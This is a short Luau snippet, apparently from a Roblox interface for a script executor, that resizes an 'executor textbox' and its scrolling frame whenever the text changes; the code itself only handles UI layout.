-- Function to update the CanvasSize and TextBox height
local function updateCanvas()
	local textBounds = unable["executor textbox"].TextBounds
	unable["executor textbox"].Size = UDim2.new(0, 392, 0, textBounds.Y + 164)
	unable["executor scrolling frame"].CanvasSize = UDim2.new(0, 0, 0, textBounds.Y + 11) -- Adjust scrolling frame
end

-- Connect the function to the TextBox's text change event
unable["executor textbox"]:GetPropertyChangedSignal("Text"):Connect(updateCanvas)

-- Initial update
updateCanvas()

